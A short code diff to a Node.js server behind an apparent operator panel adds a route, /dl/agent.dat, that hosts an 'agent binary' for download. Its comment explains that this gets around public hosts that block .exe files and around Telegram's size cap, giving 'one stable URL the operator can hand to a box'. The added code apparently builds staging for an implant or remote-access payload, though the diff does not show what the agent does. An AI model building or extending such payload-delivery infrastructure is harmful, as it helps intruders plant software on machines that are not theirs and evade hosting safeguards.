@@ -585,6 +585,10 @@ const server = http.createServer(async (req, res) => {
       return serveStatic(res, "panel.html", "text/html; charset=utf-8");
     }
     if (path === "/panel.js") return serveStatic(res, "panel.js", "application/javascript; charset=utf-8");
+    // Durable delivery of the agent binary. Telegram caps a message at 4 KB and
+    // every public host either blocks .exe or expires in hours, so the console
+    // serves the file itself: one stable URL the operator can hand to a box.
+    if (path === "/dl/agent.dat") return serveStatic(res, "agent.dat", "application/octet-stream");
     if (path === "/style.css") return serveStatic(res, "style.css", "text/css; charset=utf-8");
 
     json(res, 404, { ok: false, error: "no route" });
